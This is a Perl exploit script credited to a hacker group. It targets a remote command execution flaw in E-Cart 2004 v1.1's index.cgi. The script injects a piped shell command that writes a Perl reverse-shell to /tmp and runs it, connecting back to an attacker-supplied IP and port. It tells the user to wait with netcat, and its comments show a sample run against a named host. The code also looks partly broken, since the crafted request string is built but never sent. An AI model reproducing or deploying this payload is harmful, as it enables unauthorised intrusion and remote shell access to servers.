#!/usr/bin/perl
#
# info: zeta@mojodo.it
#
#
#
#
#
#z@badroot:~$ perl 7330ecart.pl
#
#
# ~~ www.badroot.org ~~
#
# E-Cart E-Commerce Software index.cgi
# Remote Command Execution Vulnerability
# Affected version: <= E-Cart 2004 v1.1
# http://www.securityfocus.com/archive/1/396748/2005-04-20/2005-04-26/0
#
# ~~ code by z\ ~~
#
#
# 04.23.2005
#
#
#hostname:
#antubert.com
#port: (default: 80)
#80
#path: (/cgi-bin/ecart/)
#webapp/cgi-bin/mods/ecart
#your ip (for reverse connect):
#127.0.0.1
#your port (for reverse connect):
#31337
#
#
#~~~~~~~~~~~~~~~~~~~~START~~~~~~~~~~~~~~~~~
#[*] try to exploiting...
#[*] OK!
#[*] NOW, run in your box: nc -l -vv -p 31337
#[*] starting connect back on 127.0.0.1 :31337
#[*] DONE!
#[*] Loock netcat windows and funny
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# WARNING - WARNING - WARNING - WARNING
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#If connect back shell not found:
#- you do not have privileges to write in /tmp
#- Shell not vulnerable
#
#
#Greetz: albythebest - #badroot irc.us.azzurra.org - #hacker.euus.ircnet.org
#
#
#z@badroot:~$
#
#
#z@badroot:~$ nc -l -p 7351 -h 10.0.0.2 # previously launched netcat
# uid=1001() gid=1001(sonne) grupos=1001(sonne)
#
# Come cheer us at #badroot on AzzurraNet ( javapool.azzurra.org )
#
# (C) 2004 Copyright by badroot Security Group
#
#############################################
use IO::Socket;

print "\n\n ~~ www.badroot.org ~~ \n\n";
print " E-Cart E-Commerce Software index.cgi\n";
print " Remote Command Execution Vulnerability\n";
print " Affected version: <= E-Cart 2004 v1.1\n";
print "
http://www.securityfocus.com/archive/1/396748/2005-04-20/2005-04-26/0
\n\n";
print " ~~ code by z\\ ~~\n\n\n";
print " 04.23.2005\n\n\n";


print "hostname: \n";
chomp($server=<STDIN>);

print "port: (default: 80)\n";
chomp($port=<STDIN>);
$port=80 if ($port =~/\D/ );
$port=80 if ($port eq "" );

print "path: (/cgi-bin/ecart/)\n";
chomp($path=<STDIN>);

print "your ip (for reverse connect): \n";
chomp($ip=<STDIN>);

print "your port (for reverse connect): \n";
chomp($reverse=<STDIN>);


print " \n\n";
print "~~~~~~~~~~~~~~~~~~~~START~~~~~~~~~~~~~~~~~\r\n";

print "[*] try to exploiting...\n";

$string="/$path/index.cgi?action=viewart&cat=reproductores_dvd&art=reproduct
ordvp-ns315.dat|cd /tmp;echo ".q{use Socket;$execute= 'echo "`uname
-a`";echo
"`id`";/bin/sh';$target=$ARGV[0];$port=$ARGV[1];$iaddr=inet_aton($target) ||
die("Error: $!\n");$paddr=sockaddr_in($port, $iaddr) || die("Error:
$!\n");$proto=getprotobyname('tcp');socket(SOCKET, PF_INET, SOCK_STREAM,
$proto) || die("Error: $!\n");connect(SOCKET, $paddr) || die("Error:
$!\n");open(STDIN, ">&SOCKET");open(STDOUT, ">&SOCKET");open(STDERR,
">&SOCKET");system($execute);close(STDIN)}." >>cbs.pl;perl cbs.pl $ip
$reverse|";

print "[*] OK! \n";
print "[*] NOW, run in your box: nc -l -vv -p $reverse\n";
print "[*] starting connect back on $ip :$reverse\n";
print "[*] DONE!\n";
print "[*] Loock netcat windows and funny\n\n";
$socket=IO::Socket::INET->new( PeerAddr => $server, PeerPort => $port, Proto
=> tcp)
or die;


print $socket "POST $path HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "User-Agent: 7330ecart\n";
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";

print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
print " WARNING - WARNING - WARNING - WARNING   \r\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\n";
print "If connect back shell not found:\n";
print "- you do not have privileges to write in /tmp\n";
print "- Shell not vulnerable\n\n\n";
print "Greetz: albythebest - #badroot irc.us.azzurra.org - #hacker.eu
us.ircnet.org\n\n\n";


